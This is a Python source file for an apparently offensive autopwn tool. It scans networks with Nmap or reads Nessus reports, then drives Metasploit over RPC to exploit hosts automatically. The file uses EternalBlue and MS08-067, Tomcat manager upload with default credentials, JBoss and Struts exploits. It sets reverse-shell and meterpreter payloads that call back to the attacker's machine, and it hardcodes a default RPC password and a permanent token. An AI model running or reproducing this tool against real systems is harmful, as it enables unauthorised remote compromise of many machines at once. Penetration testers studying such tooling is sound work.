#!/usr/bin/env python3

import re
import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from libnmap.process import NmapProcess
from libnessus.parser import NessusParser
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException
from libnessus.parser import NessusParser

CLIENT = msfrpc.Msfrpc({})

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    parser.add_argument("-x", "--xml", help="Nmap XML file")
    parser.add_argument("-n", "--nessus", help="Nessus .nessus file")
    parser.add_argument("--nmap-args", default='', help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print((colored('[-] ', 'red') + msg))

def print_info(msg):
    print((colored('[*] ', 'blue') + msg))

def print_good(msg):
    print((colored('[+] ', 'green') + msg))

def print_great(msg):
    print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))

def run_proc(cmd):
    '''
    Runs single commands
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)

    return proc

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def get_exploitable_hosts(report):
    '''
    Parses .nessus files for vulnerabilities that metasploit can exploit
    '''
    exploits = {}

    for i in report.hosts:
        operating_sys = i.get_host_properties['operating-system']
        rep_items = i.get_report_items
        for x in rep_items:
            vuln_info = x.get_vuln_info
            severity = x.severity
            if int(severity) > 2:
                if 'exploit_framework_metasploit' in vuln_info:
                    if vuln_info['exploit_framework_metasploit'] == 'true':
                        ip = i.address
                        port = vuln_info['port']
                        msf_mod = vuln_info['metasploit_name']
                        print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))

                        if msf_mod in exploits:
                            exploits[msf_mod].append((operating_sys, ip, port))
                        else:
                            exploits[msf_mod] = [(operating_sys, ip, port)]

    return exploits

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except IOError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts, 'autopwn-scan', args.nmap_args)

    else:
        print_bad('Specify hostlist with: -l <hostlist.txt>')
        sys.exit()

    return report

def nmap_scan(hosts, outfile, add_args):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA {}'.format(add_args, outfile)
    print_info('Running: nmap {}'.format(nmap_args))
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/{}.xml'.format(outfile))

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def get_nmap_os(host):
    '''
    Gets Nmap's guess of OS
    '''
    nmap_os_raw = host.os_class_probabilities()
    if len(nmap_os_raw) > 0:
        nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
    else:
        # Default to Windows
        nmap_os = 'Nmap unable to guess OS; defaulting to Windows'
    return nmap_os

def get_hosts(report, nse):
    '''
    Prints host data
    '''
    hosts = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            ip = host.address

            nmap_os = get_nmap_os(host)

            if nse == False:
                print_info('{} - OS: {}'.format(ip, nmap_os))

            for s in host.services:
                if s.open():

                    if host not in hosts:
                        hosts.append(host)

                    if 'product: ' in s.banner:
                        banner = s.banner.split('product: ')[1]
                    else:
                        banner = s.banner

                    port = str(s.port)

                    if nse == False:
                        print('          {} - {}'.format(port, banner))


    if len(hosts) == 0:
        if nse == True:
            msg = 'NSE '
        print_bad('No {}hosts found'.format(msg))
        sys.exit()

    return hosts

def check_named_pipes(c_id, ip, os_type):
    '''
    If we can avoid EternalBlue we will because EternalRomance/Synergy
    works on more versions of Windows
    If we can get a named pipe then we'll use Romance/Synergy over Blue
    '''
    pipes = None
    mod = 'auxiliary/scanner/smb/pipe_auditor'
    extra_opts = ''
    check = False
    mod_out = run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type)

    # Example output:
    '''
    ['RHOSTS => 192.168.243.129',
       '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
       '[*] Scanned 1 of 1 hosts (100% complete)['consoles'],
       '[*] Auxiliary module execution completed']
    '''

    for l in mod_out:
        delim = 'Pipes: '
        if delim in l:
            pipes = l.split(delim)[1].split(', ')

    return pipes

def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
    '''
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True and SRVHOST (for JBoss); even if we use aux module this just won't do anything
    '''
    local_ip = get_local_ip(get_iface())
    print_info('Setting options on {}'.format(module_path))
    cmds = """
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set SRVHOST {}\n
           set payload {}\n
           set ExitOnSession True\n
           {}\n
           """.format(rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)

    return cmds

def run_console_cmd(c_id, cmd):
    '''
    Runs module and gets output
    '''
    print_info('Running MSF command(s):')
    for l in cmd.splitlines():
        l = l.strip()
        if l != '':
            print_info('    {}'.format(l))
    print('')
    CLIENT.call('console.write',[c_id, cmd])
    time.sleep(3)
    mod_output = wait_on_busy_console(c_id)
    print('')

    return mod_output

def get_req_opts(c_id, module):
    req_opts = []
    opts = CLIENT.call('module.options', [c_id, module])
    for opt_name in opts:
        if b'required' in opts[opt_name]:
            if opts[opt_name][b'required'] == True:
                if b'default' not in opts[opt_name]:
                    req_opts.append(opt_name.decode('utf8'))
    return req_opts

def get_rhost_var(c_id, req_opts):
    for o in req_opts:
        if 'RHOST' in o:
            return o

def get_payload(module, operating_sys, target_num):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    payloads = []
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    linux_payloads = ['generic/shell_reverse_tcp',
                      'java/meterpreter/reverse_https',
                      'java/jsp_shell_reverse_tcp',
                      'cmd/unix/reverse']
    if target_num:
        payloads_dict = CLIENT.call('module.target_compatible_payloads', [module, int(target_num)])
    else:
        payloads_dict = CLIENT.call('module.compatible_payloads', [module])

    if b'error' in payloads_dict:
        if 'auxiliary' not in module:
            print_bad('Error getting payload for {}'.format(module))
        else:
            # For aux modules we just set an arbitrary real payload
            payload = win_payloads[0]
    else:
        byte_payloads = payloads_dict[b'payloads']
        for p in byte_payloads:
            payloads.append(p.decode('utf8'))

    # Set a preferred payload based on OS
    if 'windows' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p
    elif 'linux' in operating_sys.lower():
        for p in linux_payloads:
            if p in payloads:
                payload = p

    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
    if payload == None:
        if 'auxiliary' not in module:
            print_bad('No preferred payload found, first and last comapatible payloads:')
            print('    '+payloads[0])
            print('    '+payloads[-1])
            print_info('Skipping this exploit')
            return

    return payload

def check_vuln(c_id):
    '''
    Check if the machine is vulnerable
    '''
    # potential messages:
    # Check failed: ..."
    # Cannot reliably check exploitability
    cmd = 'check\n'
    out = run_console_cmd(c_id, cmd)
    not_sure_msgs = ['Cannot reliably check exploitability', 
                     'The state could not be determined',
                     'This module does not support check']
    if out == []:
        print_info('Unsure if vulnerable, continuing with exploit')
        return True
    for l in out:
        if 'is vulnerable' in l:
            print_good('Vulnerable!')
            return True
        elif any(x in l for x in not_sure_msgs) or l == '':
            print_info('Unsure if vulnerable, continuing with exploit')
            return True

    return False

def run_nessus_exploits(c_id, exploits):
    '''
    Matches metasploit module description from Nessus output to the
    actual module path. Doesn't do aux (so no DOS), just exploits
    '''
    # There might be a better way to do this but idk it
    # The way MSF search works is with an OR in between words even wrapped in quotes
    # ... dumb.
    print_info("Collecting list of all Metasploit modules...")
    all_mods = CLIENT.call('module.search', ['a e i o u'])
    for mod_desc in exploits:

        # convert mod_desc into mod_path
        path = None
        for mod in all_mods:
            if mod[b'name'].decode('utf8') == mod_desc:
                path = mod[b'fullname'].decode('utf8')

                # Prevent auxiliary and post modules, all DOS modules are auxiliary
                if not path.startswith('exploit/'):
                    path = None
                    break
                print_info('Using module {}'.format(path))

        if not path:
            print_bad('Error finding module with description: {}'.format(mod_desc))
            continue

        for os_type, ip, port in exploits[mod_desc]:
            extra_opts = ''
            check = True
            mod_out = run_msf_module(c_id, ip, path, port, extra_opts, check, os_type)

def get_nse_scripts(hosts):
    nse_scripts = {}

    for host in hosts:
        ip = host.address
        nmap_os = get_nmap_os(host)
        if 'windows' in nmap_os.lower():
            os_type = 'windows'
        else:
            os_type = 'linux'

        for s in host.services:
            if s.open():
                port = str(s.port)
                ip_port = ip+":"+port

                # Run SMB vuln scripts
                if s.port == 445 and os_type == 'windows':
                    port = str(s.port)
                    smb_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']
                    if ip in nse_scripts:
                        nse_scripts[ip][port] = smb_scripts
                    else:
                        nse_scripts[ip] = {port:smb_scripts}

                # Run HTTP scripts
                #elif 'http' in s.service:
                #    http_scripts = ['http-title']
                #    if ip in nse_scripts:
                #        nse_scripts[ip][port] = http_scripts
                #    else:
                #        nse_scripts[ip] = {port:http_scripts}

    return nse_scripts

def run_nse_scripts(nse_scripts):
    '''
    We only run nse scripts after we know its possibly vuln
    '''
    # nse_scripts = {'ip':{'port':['script1', 'script2']}}
    hosts_lst = []
    ports_lst = []
    scripts_lst = []

    for ip in nse_scripts:
        hosts_lst.append(ip)
        for port in nse_scripts[ip]:
            ports_lst.append(port)
            for scripts in nse_scripts[ip][port]:
                scripts_lst.append(scripts)

    ports = ','.join(list(set(ports_lst)))
    scripts = ','.join(list(set(scripts_lst)))

    report = nmap_scan(hosts_lst, 'nse-scan', '-p {} --script {}'.format(ports, scripts))

    return report

def run_nmap_exploits(c_id, hosts, nse_hosts):
    '''
    Checks for exploitable services on a host
    '''
    # These are for host scripts and service script vulns
    for nse_host in nse_hosts:
        check_host_scripts(c_id, nse_host)
        check_service_scripts(c_id, nse_host)

    # These are the regular first Nmap hosts service output, no scripts
    for host in hosts:
        check_nmap_services(c_id, host)

def check_host_scripts(c_id, host):
    # Check for host script results
    ip = host.address
    os_type = get_nmap_os(host)

    ms08_vuln = check_nse_host_scripts(host, 'smb-vuln-ms08-067')
    if ms08_vuln:
        check = True
        mod = 'exploit/windows/smb/ms08_067_netapi'
        port = '445'
        mod_out = run_msf_module(c_id, ip, mod, port, '', check, os_type)

    ms17_vuln = check_nse_host_scripts(host, 'smb-vuln-ms17-010')
    if ms17_vuln:
        mod_out = run_ms17(c_id, ip, os_type)

def check_nse_host_scripts(host, script):
    '''
    Check if host if vulnerable via nse script
    '''
    ports = []
    ip = host.address

    for s in host.scripts_results:
        if s['id'] == script:
            if 'State: VULNERABLE' in s['output']:
                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                return True

    return False

def check_service_scripts(c_id, host):
    for s in host.services:
        if s.open():
            port = str(s.port)
            #for script in s.scripts_results:
            #    if script['id'] == 'http-title':
            #        script_out = script['output']

def check_nmap_services(c_id, host):
    '''
    Checks Nmap service banners for potential vulnerabilities
    '''
    mods = []
    ip = host.address
    os_type = get_nmap_os(host)

    for s in host.services:
        if s.open():
            port = str(s.port)

            if 'Apache Tomcat/Coyote JSP engine' in s.banner:

                # JBoss - jboss_mods may return empty list
                jboss_mods = check_for_jboss_vulns(c_id, port, ip, os_type)
                mods += jboss_mods

                # Struts DMI REST exec
                # Can Struts be run without Tomcat? Maybe, but seems really rare
                struts_mod = ('exploit/multi/http/struts_dmi_rest_exec', port)
                mods.append(struts_mod)

                # Tomcat manager upload with default creds
                tomcat_mgr_mod = ('exploit/multi/http/tomcat_mgr_upload', port)
                mods.append(tomcat_mgr_mod)

    if len(mods) > 0:
        for m in mods:
            check = True
            mod = m[0]
            port = m[1]
            mod_out = run_msf_module(c_id, ip, mod, port, '', check, os_type)
            check_for_retry(c_id, mod_out)

def check_for_retry(c_id, mod_out):
    '''
    Sometimes some modules retry after failing but the console won't
    say it's busy while the module sleeps for X seconds which means
    the script will continue but the sleepy module's handler will interfere
    with further exploits
    '''
    sleep_time = None
    for l in mod_out:
        re_sleep_time = re.search('retrying in (\d) seconds', l)
        if re_sleep_time:
            sleep_time = int(re_sleep_time.group(1))+2
            break

    if sleep_time:
        time.sleep(sleep_time)
        new_out = print_cur_output(c_id)
        check_for_retry(c_id, new_out)

def check_for_jboss_vulns(c_id, port, ip, os_type):
    '''
    Checks if page is running vulnerable JBoss
    '''
    jboss_mods = []
    jboss_vuln_scan = 'auxiliary/scanner/http/jboss_vulnscan'
    extra_opts = ''
    check = False
    mod_out = run_msf_module(c_id, ip, jboss_vuln_scan, port, extra_opts, check, os_type)

    jmx_console_mod = ('exploit/multi/http/jboss_maindeployer', port)
    #jmx_console_mod2 = 'exploit/multi/http/jboss_bshdeployer'
    for l in mod_out:
        if '/jmx-console/HtmlAdaptor does not require authentication' in l:
            jboss_mods.append(jmx_console_mod)
        if '/invoker/JMXInvokerServlet does not require authentication' in l:
            print_great('JBoss may be vulnerable to deserialization! Requires manual exploitation')

    return jboss_mods

def set_target(c_id, mod, os_type):
    '''
    Sets the correct target based on OS
    Skips auxiliary modules
    '''

    # Skip aux modules
    if 'auxiliary' in mod:
        cmd = 'use {}\n'.format(mod)
    else:
        cmd = 'use {}\nshow targets\n'.format(mod)

    targets = run_console_cmd(c_id, cmd)

    if 'windows' in os_type.lower():
        os_type = 'windows'
    else:
        os_type = 'linux'

    for l in targets:
        if 'No exploit module selected' in l:
            return
        re_opt_num = re.match('(\d)   ', l)
        if re_opt_num:
            target_num = re_opt_num.group(1)
            if 'Windows Universal' in l and os_type == 'windows':
                run_console_cmd(c_id, 'set target {}'.format(target_num))
                return target_num
            elif 'Linux Universal' in l and os_type == 'linux':
                run_console_cmd(c_id, 'set target {}'.format(target_num))
                return target_num

def run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type):
    local_ip = get_local_ip(get_iface())
    req_opts = get_req_opts(c_id, mod)

    for o in req_opts:
        if 'RHOST' in o:
            rhost_var = o

    target_num = set_target(c_id, mod, os_type)
    payload = get_payload(mod, os_type, target_num)
    cmd = create_msf_cmd(mod, rhost_var, ip, port, payload, extra_opts)
    settings_out = run_console_cmd(c_id, cmd)

    if check == True:
        print_info('Checking if host is vulnerable...')
        mod_out = run_if_vuln(c_id, cmd)
    else:
        exploit_cmd = 'exploit -z\n'
        mod_out = run_console_cmd(c_id, exploit_cmd)

    return mod_out

def run_ms17(c_id, ip, os_type):
    '''
    Exploit ms17_010
    '''
    # Check for named pipe availability (preVista you could just grab em)
    # If we find one, then use Romance/Synergy instead of Blue
    port = '445'
    named_pipe = None

    named_pipes = check_named_pipes(c_id, ip, os_type)

    # Just use the first named pipe
    if named_pipes:
        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
        named_pipe = named_pipes[0]
        mod = 'exploit/windows/smb/ms17_010_psexec'
        extra_opts = 'set NAMEDPIPE {}'.format(named_pipe)
    else:
        print_info('Named pipe not found. Performing ms17_010_eternalblue')
        mod = 'exploit/windows/smb/ms17_010_eternalblue'
        extra_opts = 'set MaxExploitAttempts 6'
    
    check = True
    mod_out = run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type)

    return mod_out

def run_if_vuln(c_id, cmd):
    is_vulnerable = check_vuln(c_id)
    if is_vulnerable == True:
        exploit_cmd = 'exploit -z\n'
        mod_out = run_console_cmd(c_id, exploit_cmd)

        return mod_out

def print_cur_output(c_id):
    output = []
    cur_output = CLIENT.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
    for l in cur_output:
        l = l.strip()
        if l != '':
            output.append(l)
            if re.search('Session . created in the background', l):
                print_great(l)
            else:
                print('    '+l)

    return output

def wait_on_busy_console(c_id):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    output = []
    list_offset = int([x[b'id'] for x in CLIENT.call('console.list')[b'consoles'] if x[b'id'] is bytes(c_id, 'utf8')][0])
    # Get any initial output
    cur_out = print_cur_output(c_id)
    output += cur_out
    while CLIENT.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
        cur_out = print_cur_output(c_id)
        output += cur_out
        time.sleep(1)

    # Get remaining output
    cur_out = print_cur_output(c_id)
    output += cur_out

    return output

def main(report, args):
    global CLIENT

    # Authenticate and grab a permanent token
    CLIENT.login(args.username, args.password)
    CLIENT.call('auth.token_add', ['Au70PwN'])
    CLIENT.token = 'Au70PwN'

    c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']]

    if len(c_ids) == 0:
        CLIENT.call('console.create')
        c_ids = [x[b'id'] for x in CLIENT.call('console.list')[b'consoles']] # Wait for response
        time.sleep(2)

    # Get the latest console
    c_id = c_ids[-1].decode('utf8')
    # Clear console output
    CLIENT.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    if args.nessus:
        # exploits = {'msf_module_name':[(ip, port), (ip, port)]
        exploits = get_exploitable_hosts(report)
        run_nessus_exploits(c_id, exploits)
        remainder_output = wait_on_busy_console(c_id)
    else:
        # hosts = {ip : [(port, banner), (port2, banner2)]
        hosts = get_hosts(report, False)
        nse_scripts = get_nse_scripts(hosts)
        nse_report = run_nse_scripts(nse_scripts)
        nse_hosts = get_hosts(nse_report, True)
        run_nmap_exploits(c_id, hosts, nse_hosts)
        remainder_output = wait_on_busy_console(c_id)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    if args.nessus:
        report = NessusParser.parse_fromfile(args.nessus)
    else:
        report = parse_nmap(args)
    main(report, args)

#TODO
# Add JBoss, Tomcat, Jenkins, WebSphere
